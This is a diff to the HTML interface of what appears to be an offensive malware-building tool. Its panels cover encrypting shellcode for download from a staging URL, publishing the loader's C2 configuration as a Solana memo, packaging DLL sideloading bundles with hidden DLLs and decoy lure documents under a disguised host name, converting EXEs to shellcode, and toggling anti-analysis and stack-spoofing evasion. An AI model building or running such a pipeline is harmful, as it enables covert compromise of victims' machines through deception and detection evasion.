@@ -8,6 +8,7 @@
 </head>
 <body>
 
+<!-- ═══════════════════════════ top bar ═══════════════════════════ -->
 <header class="top">
   <div class="brand">
     <span class="glyph">◼</span>
@@ -21,126 +22,490 @@
   </div>
 </header>
 
-<nav class="tabs">
-  <button class="tab active" data-tab="encrypt">1 · Encrypt</button>
-  <button class="tab" data-tab="sideload">2 · Sideload</button>
-  <button class="tab" data-tab="build">3 · Build</button>
+<!-- ═══════════════════════════ page nav ══════════════════════════ -->
+<nav class="page-nav">
+  <button class="page-btn active" data-page="build">◼ Build</button>
+  <button class="page-btn" data-page="sideload">⬡ Sideload</button>
+  <button class="page-btn" data-page="donut">◈ Donut</button>
+  <button class="page-btn" data-page="solana">◆ Solana</button>
 </nav>
 
-<main class="stage">
+<!-- ═══════════════════════════ pages ═════════════════════════════ -->
+<div class="pages">
 
-  <!-- ===== Encrypt ===== -->
-  <section class="panel active" id="panel-encrypt">
-    <div class="panel-head">
-      <h2>Encrypt shellcode</h2>
-      <p>Runs <code>python Encrypt.py &lt;shellcode&gt; --url &lt;url&gt;</code>. Regenerates <code>Payload.h</code> and the encrypted payload (named after the URL basename — e.g. <code>payload.dat</code>).</p>
-    </div>
+<!-- ─────────────────── PAGE 1 · Build ─────────────────────────── -->
+<div class="page active" id="page-build">
+  <div class="build-layout">
 
-    <form id="form-encrypt" class="form">
-      <label class="field">
-        <span>Shellcode binary</span>
-        <input type="file" name="shellcode" required>
-      </label>
+    <div class="build-main">
+      <nav class="tabs">
+        <button class="tab active" data-tab="encrypt">1 · Encrypt</button>
+        <button class="tab" data-tab="sideload">2 · Sideload</button>
+        <button class="tab" data-tab="build">3 · Build</button>
+      </nav>
 
-      <label class="field">
-        <span>Staging URL</span>
-        <input type="url" name="url" placeholder="https://c2.example.com/payload.dat" required>
-      </label>
+      <div class="build-stage">
 
-      <div class="actions">
-        <button type="submit" class="primary">Encrypt</button>
-        <span class="hint">A new Chaskey key, nonce, XOR rotation, and URL cipher are generated on every run.</span>
+        <!-- ── Encrypt panel ─────────────────────────────────── -->
+        <section class="panel active" id="panel-encrypt">
+          <div class="panel-head">
+            <h2>Encrypt shellcode</h2>
+            <p>Runs <code>Encrypt.py</code>. Produces an encrypted <code>.dat</code> payload and a
+            <strong>memo string</strong> you post on-chain as the <em>first transaction</em> from your beacon
+            wallet. The binary only embeds the wallet address — URL, key, nonce, size, and compression flag
+            all live on-chain.</p>
+          </div>
+          <form id="form-encrypt" class="form">
+
+            <!-- Shellcode source -->
+            <div class="field">
+              <span>Shellcode</span>
+              <div class="src-toggle">
+                <label class="src-opt"><input type="radio" name="sc_src" value="workspace" checked> From Donut workspace</label>
+                <label class="src-opt"><input type="radio" name="sc_src" value="upload"> Upload file</label>
+              </div>
+              <select id="enc-sc-job" name="shellcode_job_id" class="select-field">
+                <option value="">— no successful Donut jobs yet —</option>
+              </select>
+              <input type="file" id="enc-sc-file" name="shellcode" class="hidden-src">
+            </div>
+
+            <!-- Wallet selector -->
+            <div class="field">
+              <span>Beacon wallet</span>
+              <select id="enc-wallet-sel" class="select-field">
+                <option value="">— select from Solana workspace —</option>
+              </select>
+              <input type="text" name="sol_wallet" id="enc-wallet"
+                     placeholder="Or paste base58 address manually (32–44 chars)"
+                     pattern="[1-9A-HJ-NP-Za-km-z]{32,44}"
+                     autocomplete="off" spellcheck="false">
+            </div>
+
+            <!-- Staging URL -->
+            <label class="field">
+              <span>Staging URL <em>— HTTPS location where you'll host the encrypted <code>.dat</code> file</em></span>
+              <input type="url" name="url" id="enc-url"
+                     placeholder="https://c2.example.com/payload.dat" required>
+              <span style="font-size:11px;color:var(--text-mute);margin-top:2px">
+                The loader downloads this file at runtime. The URL is compiled into the binary
+                (XOR-encoded) and also stored in the on-chain memo.
+              </span>
+            </label>
+
+            <label class="field">
+              <span>RPC endpoint <em>(optional — default: mainnet-beta)</em></span>
+              <input type="url" name="rpc_url" id="enc-rpc" placeholder="https://api.devnet.solana.com">
+            </label>
+
+            <div class="actions">
+              <button type="submit" class="primary">Encrypt</button>
+              <span class="hint">New key, nonce, XOR rotation, and placement key on every run.</span>
+            </div>
+          </form>
+
+          <pre class="console" id="out-encrypt"></pre>
+
+          <!-- Memo box -->
+          <div class="memo-wrap hidden" id="memo-wrap">
+            <div class="memo-header">
+              <span class="memo-label">📋 On-chain memo — post as the first tx from your beacon wallet</span>
+              <div class="memo-header-btns">
+                <button class="copy-btn" id="btn-copy-memo">Copy</button>
+                <button class="copy-btn" id="btn-dl-memo" title="Save memo.txt to disk">↓ Save</button>
+              </div>
+            </div>
+            <pre class="memo-box" id="memo-box"></pre>
+            <p class="memo-hint">
+              Format: <code>&lt;url&gt;|&lt;key&gt;|&lt;nonce&gt;|&lt;size&gt;|&lt;compressed&gt;</code>
+              — send via any Solana wallet as an
+              <a href="https://spl.solana.com/memo" target="_blank" rel="noopener">SPL Memo</a> instruction.
+            </p>
+          </div>
+
+
+          <details class="preview-wrap">
+            <summary>Payload.h preview (first 4 KB)</summary>
+            <pre class="preview" id="preview-payload"></pre>
+          </details>
+
+          <!-- Encrypt History -->
+          <div class="history-section" id="encrypt-history-section">
+            <div class="history-head">
+              <span class="history-title">ENCRYPT HISTORY</span>
+              <button class="btn-xs" id="btn-refresh-encrypt-hist">↺ Refresh</button>
+            </div>
+            <div id="encrypt-history-list">
+              <p class="empty-note" id="encrypt-hist-empty">No encrypt runs yet.</p>
+            </div>
+          </div>
+
+        </section>
+
+        <!-- ── Sideload config panel ──────────────────────────── -->
+        <section class="panel" id="panel-sideload">
+          <div class="panel-head">
+            <h2>Sideload config</h2>
+            <p>Select the target DLL and host EXE from the <strong>Sideload workspace</strong>.
+               <code>SideloadGen.py</code> runs automatically when you click Build.
+               The output is a ZIP ready to deploy.</p>
+          </div>
+          <div class="form">
+
+            <!-- Target DLL -->
+            <div class="field">
+              <span>Target DLL <em>(required — from Sideload workspace)</em></span>
+              <select id="sl-dll-sel" class="select-field">
+                <option value="">— no DLLs in workspace yet —</option>
+              </select>
+            </div>
+
+            <!-- Host EXE -->
+            <div class="field">
+              <span>Host EXE <em>(required — from Sideload workspace)</em></span>
+              <select id="sl-exe-sel" class="select-field">
+                <option value="">— no EXEs in workspace yet —</option>
+              </select>
+            </div>
+
+            <!-- Rename options -->
+            <div class="row">
+              <label class="field">
+                <span>Original DLL rename <em>(optional)</em></span>
+                <input type="text" id="sl-dll-rename" placeholder="target_orig.dll"
+                       autocomplete="off" spellcheck="false">
+                <span style="font-size:11px;color:var(--text-mute)">Forwarding target inside Sideload.h. Defaults to <code>target_orig.dll</code>.</span>
+              </label>
+              <label class="field">
+                <span>Host EXE rename in ZIP <em>(optional)</em></span>
+                <input type="text" id="sl-host-rename" placeholder="e.g. Microsoft Teams.exe"
+                       autocomplete="off" spellcheck="false">
+                <span style="font-size:11px;color:var(--text-mute)">Filename given to the host EXE inside the output ZIP.</span>
+              </label>
+            </div>
+
+            <!-- Bind file (optional) -->
+            <div class="field">
+              <span>Bind file <em>(optional — lure document opened before shellcode runs)</em></span>
+              <select id="sl-bind-sel" class="select-field">
+                <option value="">— none —</option>
+              </select>
+              <span style="font-size:11px;color:var(--text-mute)">
+                Placed in a hidden <code>_\</code> folder next to the loader. Opened via
+                <code>ShellExecuteA("open")</code> to display a decoy document.
+              </span>
+            </div>
+
+            <!-- Bind file rename -->
+            <label class="field">
+              <span>Bind file name in ZIP <em>(optional — defaults to uploaded filename)</em></span>
+              <input type="text" id="sl-bind-rename" placeholder="e.g. Quarterly Report Q1 2025.pdf"
+                     autocomplete="off" spellcheck="false">
+            </label>
+
+            <!-- ZIP output name -->
+            <label class="field">
+              <span>ZIP output name <em>(required)</em></span>
+              <input type="text" id="sl-zip-name" placeholder="deploy.zip"
+                     autocomplete="off" spellcheck="false" required>
+              <span style="font-size:11px;color:var(--text-mute)">
+                ZIP will contain: <strong>proxy DLL</strong> (hidden) · <strong>original DLL</strong> (hidden, renamed) · <strong>host EXE</strong> · <em>_\bind file</em> (if set).
+              </span>
+            </label>
+
+          </div>
+        </section>
+
+        <!-- ── Build panel ────────────────────────────────────── -->
+        <section class="panel" id="panel-build">
+          <div class="panel-head">
+            <h2>Build</h2>
+            <p>Runs <code>build.bat</code> (MSVC + ml64 + Mutate.py). Requires Payload.h; sideload also needs Sideload.h.</p>
+          </div>
+          <form id="form-build" class="form">
+            <div class="row">
+              <label class="field radio">
+                <input type="radio" name="mode" value="exe" checked>
+                <span>EXE loader</span>
+              </label>
+              <label class="field radio">
+                <input type="radio" name="mode" value="sideload">
+                <span>DLL sideload</span>
+              </label>
+            </div>
+            <!-- sideload summary — shown only in sideload mode -->
+            <div id="field-sideload-summary" class="field sideload-summary hidden">
+              <span>Sideload config</span>
+              <div id="bld-sl-summary" class="sl-summary-box">
+                No DLL / EXE selected — configure in the <strong>Sideload</strong> tab.
+              </div>
+            </div>
+            <fieldset class="field">
+              <legend>Compile-time flags</legend>
+              <label class="check"><input type="checkbox" name="uac" id="bld-uac">       <span>UAC — <code>/MANIFESTUAC</code> (EXE) or self-elevation (DLL)</span></label>
+              <label class="check"><input type="checkbox" name="rwx" id="bld-rwx">       <span>RWX_SHELLCODE — <code>PAGE_EXECUTE_READWRITE</code> for Go/Sliver</span></label>
+              <label class="check"><input type="checkbox" name="debug" id="bld-debug">   <span>DEBUG — logs to <code>debug.log</code>, skips anti-analysis</span></label>
+              <label class="check"><input type="checkbox" name="synthetic" id="bld-syn"> <span>ENABLE_SYNTHETIC_STACK — Draugr RSP swap (opt-in)</span></label>
+            </fieldset>
+            <div class="actions">
+              <button type="submit" class="primary">Build</button>
+              <button type="button" id="btn-refresh-arts">Refresh artifacts</button>
+            </div>
+          </form>
+          <pre class="console" id="out-build"></pre>
+
+          <!-- Build History -->
+          <div class="history-section" id="build-history-section">
+            <div class="history-head">
+              <span class="history-title">BUILD HISTORY</span>
+              <button class="btn-xs" id="btn-refresh-build-hist">↺ Refresh</button>
+            </div>
+            <div id="build-history-list">
+              <p class="empty-note" id="build-hist-empty">No builds yet.</p>
+            </div>
+          </div>
+
+        </section>
+
+      </div><!-- .build-stage -->
+    </div><!-- .build-main -->
+
+    <!-- sidebar -->
+    <aside class="build-sidebar">
+
+      <!-- profiles -->
+      <div class="sb-section">
+        <div class="sb-head">
+          <h3>Profiles</h3>
+          <button class="btn-sm" id="btn-show-save-profile">Save current</button>
+        </div>
+        <div id="profile-save-row" class="save-row hidden">
+          <input type="text" id="profile-name-input" placeholder="Profile name…" class="save-input">
+          <button class="btn-sm primary" id="btn-confirm-save-profile">Save</button>
+          <button class="btn-sm" id="btn-cancel-save-profile">✕</button>
+          <a id="btn-saveas-new" class="save-as-link hidden" href="#">save as new</a>
+        </div>
+        <ul id="profile-list" class="mgmt-items"></ul>
+        <p class="empty-note hidden" id="profile-empty">No profiles saved.</p>
       </div>
-    </form>
 
-    <pre class="console" id="out-encrypt"></pre>
-    <details class="preview-wrap">
-      <summary>Payload.h preview (first 4 KB)</summary>
-      <pre class="preview" id="preview-payload"></pre>
-    </details>
-  </section>
+      <!-- artifacts -->
+      <div class="sb-section" style="margin-top:20px">
+        <div class="sb-head">
+          <h3>Artifacts</h3>
+        </div>
+        <ul id="artifact-list" class="artifacts"></ul>
+        <p class="footnote">Recent builds from workspace (last 10).</p>
+      </div>
 
-  <!-- ===== Sideload ===== -->
-  <section class="panel" id="panel-sideload">
-    <div class="panel-head">
-      <h2>DLL sideload generator</h2>
-      <p>Runs <code>python SideloadGen.py &lt;target.dll&gt;</code>. Generates <code>Sideload.h</code> export forwards and <code>Sideload.rc</code> version info.</p>
+    </aside>
+
+  </div><!-- .build-layout -->
+</div><!-- #page-build -->
+
+
+<!-- ─────────────────── PAGE 2 · Sideload ──────────────────────── -->
+<div class="page" id="page-sideload">
+  <div class="sl-mgmt-layout">
+
+    <!-- ── DLL workspace ──────────────────────────────────── -->
+    <div class="sl-mgmt-col">
+      <div class="sl-col-head">
+        <h3>TARGET DLLs</h3>
+        <label class="btn-sm primary sl-upload-btn" for="sl-dll-upload">+ Upload DLL</label>
+        <input type="file" id="sl-dll-upload" accept=".dll" class="hidden">
+      </div>
+      <div id="dll-list" class="sl-asset-list">
+        <p class="empty-note" id="dll-empty">No DLLs uploaded yet.</p>
+      </div>
     </div>
 
-    <form id="form-sideload" class="form">
-      <label class="field">
-        <span>Target DLL (original from <code>C:\Windows\System32\</code>)</span>
-        <input type="file" name="dll" required>
-      </label>
+    <!-- ── EXE workspace ──────────────────────────────────── -->
+    <div class="sl-mgmt-col">
+      <div class="sl-col-head">
+        <h3>HOST EXEs</h3>
+        <label class="btn-sm primary sl-upload-btn" for="sl-exe-upload">+ Upload EXE</label>
+        <input type="file" id="sl-exe-upload" accept=".exe" class="hidden">
+      </div>
+      <div id="exe-list" class="sl-asset-list">
+        <p class="empty-note" id="exe-empty">No EXEs uploaded yet.</p>
+      </div>
+    </div>
 
-      <div class="row">
+    <!-- ── Bind files workspace ───────────────────────────── -->
+    <div class="sl-mgmt-col">
+      <div class="sl-col-head">
+        <h3>BIND FILES</h3>
+        <label class="btn-sm primary sl-upload-btn" for="sl-bind-upload">+ Upload</label>
+        <input type="file" id="sl-bind-upload" class="hidden">
+      </div>
+      <div id="bind-list" class="sl-asset-list">
+        <p class="empty-note" id="bind-empty">No bind files uploaded yet.</p>
+      </div>
+      <div class="sl-col-foot">
+        <p class="sl-col-hint">Lure document opened via <code>ShellExecuteA</code> before shellcode runs.
+          Placed in a hidden <code>_\</code> folder next to the loader.
+          Proxy DLL and original DLL receive the hidden file attribute in the ZIP.</p>
+      </div>
+    </div>
+
+  </div>
+</div><!-- #page-sideload -->
+
+
+<!-- ─────────────────── PAGE 3 · Donut ─────────────────────────── -->
+<div class="page" id="page-donut">
+  <div class="mgmt-layout">
+
+    <aside class="mgmt-list">
+      <div class="mgmt-list-head">
+        <h3>CONVERSION HISTORY</h3>
+      </div>
+      <div id="donut-history" class="mgmt-items-scroll">
+        <p class="empty-note" id="donut-empty">No conversions yet.</p>
+      </div>
+    </aside>
+
+    <div class="mgmt-detail">
+      <div class="panel-head">
+        <h2>EXE → Shellcode</h2>
+        <p>Converts a PE executable to position-independent shellcode via <code>donut.exe</code>.
+           Each conversion is saved with a unique ID — original and shellcode are both kept for download.</p>
+      </div>
+
+      <form id="form-donut" class="form">
         <label class="field">
-          <span>Renamed original (optional)</span>
-          <input type="text" name="rename" placeholder="target_orig.dll">
+          <span>PE executable</span>
+          <input type="file" name="exe" accept=".exe,.dll" required>
         </label>
         <label class="field">
-          <span>Host EXE hint (optional)</span>
-          <input type="text" name="exe" placeholder="host.exe">
+          <span>Architecture</span>
+          <select name="arch" class="select-field">
+            <option value="2" selected>x64 (default)</option>
+            <option value="1">x86</option>
+            <option value="3">x86 + x64</option>
+          </select>
         </label>
-      </div>
+        <div class="actions">
+          <button type="submit" class="primary">Convert</button>
+          <span class="hint">Runs <code>donut.exe -a &lt;arch&gt; -i &lt;file&gt; -o shellcode.bin</code></span>
+        </div>
+      </form>
 
-      <div class="actions">
-        <button type="submit" class="primary">Generate</button>
-        <span class="hint">The PE export table is parsed and every export gets a <code>/export:</code> linker pragma pointing at the renamed original.</span>
-      </div>
-    </form>
+      <pre class="console" id="out-donut"></pre>
 
-    <pre class="console" id="out-sideload"></pre>
-  </section>
-
-  <!-- ===== Build ===== -->
-  <section class="panel" id="panel-build">
-    <div class="panel-head">
-      <h2>Build</h2>
-      <p>Runs <code>build.bat</code> (MSVC + ml64 + <code>Mutate.py</code>). Requires Payload.h; sideload mode also requires Sideload.h.</p>
+      <div id="donut-result" class="dl-wrap hidden"></div>
     </div>
 
-    <form id="form-build" class="form">
-      <div class="row">
-        <label class="field radio">
-          <input type="radio" name="mode" value="exe" checked>
-          <span>EXE loader</span>
-        </label>
-        <label class="field radio">
-          <input type="radio" name="mode" value="sideload">
-          <span>DLL sideload</span>
-        </label>
+  </div>
+</div><!-- #page-donut -->
+
+
+<!-- ─────────────────── PAGE 3 · Solana ─────────────────────────── -->
+<div class="page" id="page-solana">
+  <div class="mgmt-layout">
+
+    <aside class="mgmt-list">
+      <div class="mgmt-list-head">
+        <h3>WALLETS</h3>
+      </div>
+      <div class="wallet-create-row">
+        <input type="text" id="new-wallet-name" class="save-input" placeholder="Wallet name…">
+        <button class="btn-sm primary" id="btn-create-wallet">+ Create</button>
+      </div>
+      <div id="wallet-list" class="mgmt-items-scroll">
+        <p class="empty-note" id="wallet-empty">No wallets yet.</p>
+      </div>
+    </aside>
+
+    <div class="mgmt-detail" id="wallet-detail">
+
+      <!-- placeholder -->
+      <div id="wallet-none" class="wallet-none">
+        <span style="font-size:20px;color:var(--text-mute)">◆</span>
+        <p>Select a wallet or create one.</p>
       </div>
 
-      <label class="field" id="field-output">
-        <span>Output filename (sideload only)</span>
-        <input type="text" name="output" placeholder="version.dll">
-      </label>
+      <!-- selected wallet panel (hidden until selection) -->
+      <div id="wallet-panel" class="hidden">
 
-      <fieldset class="field">
-        <legend>Compile-time flags</legend>
-        <label class="check"><input type="checkbox" name="uac">       <span>UAC — <code>/MANIFESTUAC</code> (EXE) or self-elevation (DLL)</span></label>
-        <label class="check"><input type="checkbox" name="rwx">       <span>RWX_SHELLCODE — <code>PAGE_EXECUTE_READWRITE</code> for Go/Sliver</span></label>
-        <label class="check"><input type="checkbox" name="debug">     <span>DEBUG — logs to <code>debug.log</code>, skips anti-analysis</span></label>
-        <label class="check"><input type="checkbox" name="synthetic"> <span>ENABLE_SYNTHETIC_STACK — Draugr MVP RSP swap (opt-in)</span></label>
-      </fieldset>
+        <div class="wallet-info-bar">
+          <div>
+            <div class="wallet-panel-name" id="wp-name"></div>
+            <div class="wallet-addr-row">
+              <div class="wallet-panel-addr" id="wp-addr"></div>
+              <button class="btn-xs" id="btn-copy-addr" title="Copy address">Copy</button>
+            </div>
+          </div>
+          <div class="wallet-panel-btns">
+            <button class="btn-sm" id="btn-wallet-rename">Rename</button>
+            <a class="btn-sm" id="btn-wallet-dl-kp" href="#">↓ Keypair</a>
+            <button class="btn-sm btn-danger" id="btn-wallet-delete">Delete</button>
+          </div>
+        </div>
 
-      <div class="actions">
-        <button type="submit" class="primary">Build</button>
-        <button type="button" id="btn-refresh-arts">Refresh artifacts</button>
-      </div>
-    </form>
+        <!-- rename row -->
+        <div id="wallet-rename-row" class="save-row hidden" style="margin-bottom:16px">
+          <input type="text" id="wallet-rename-input" class="save-input" placeholder="New name…">
+          <button class="btn-sm primary" id="btn-confirm-rename">Save</button>
+          <button class="btn-sm" id="btn-cancel-rename">✕</button>
+        </div>
 
-    <pre class="console" id="out-build"></pre>
-  </section>
+        <!-- shared RPC -->
+        <label class="field" style="margin-bottom:16px;max-width:480px">
+          <span>RPC endpoint <em>(optional — connects to mainnet-beta if blank)</em></span>
+          <input type="url" id="wp-rpc" placeholder="https://api.devnet.solana.com">
+        </label>
 
-</main>
+        <div class="wallet-actions-grid">
 
-<aside class="sidebar">
-  <h3>Artifacts</h3>
-  <ul id="artifact-list" class="artifacts"></ul>
-  <p class="footnote">Files in the project root that match <code>*.exe</code> / <code>*.dll</code>.</p>
-</aside>
+          <!-- publish -->
+          <div class="wallet-action-card">
+            <h4>Publish memo</h4>
+            <p class="section-desc">Posts memo on-chain as an SPL Memo transaction.
+               Paste the contents of the memo from the Encrypt tab, or use the
+               quick-publish button there.</p>
+            <form id="form-publish" class="form">
+              <label class="field">
+                <span>Memo text</span>
+                <textarea name="memo" id="wp-memo" rows="3"
+                  placeholder="https://c2.example.com/x.dat|key|nonce|size|compressed"
+                  spellcheck="false" autocomplete="off" required></textarea>
+              </label>
+              <div class="actions">
+                <button type="submit" class="primary">Publish on-chain</button>
+                <span class="hint">~0.000005 SOL per tx. Wallet must be funded.</span>
+              </div>
+            </form>
+            <pre class="console" id="out-publish"></pre>
+          </div>
+
+          <!-- lookup -->
+          <div class="wallet-action-card">
+            <h4>Look up memo</h4>
+            <p class="section-desc">
+              Read SPL Memo transactions from this wallet.<br>
+              <strong>Latest</strong> — most recent memo (what you last published).<br>
+              <strong>Beacon mode</strong> — oldest tx ever sent from this wallet.
+              This is what the <em>compiled loader reads at runtime</em>:
+              the binary finds its C2 config by looking up the very first transaction
+              from the embedded wallet address.
+            </p>
+            <div class="actions" style="margin-top:0;margin-bottom:0;gap:8px">
+              <button id="btn-lookup-latest" class="primary btn-sm">Get Latest Memo</button>
+              <button id="btn-lookup-beacon" class="btn-sm">Get Beacon Memo (oldest)</button>
+            </div>
+            <pre class="console" id="out-lookup"></pre>
+          </div>
+
+        </div><!-- .wallet-actions-grid -->
+      </div><!-- #wallet-panel -->
+
+    </div><!-- .mgmt-detail -->
+  </div>
+</div><!-- #page-solana -->
+
+</div><!-- .pages -->
 
 <script src="app.js"></script>
 </body>
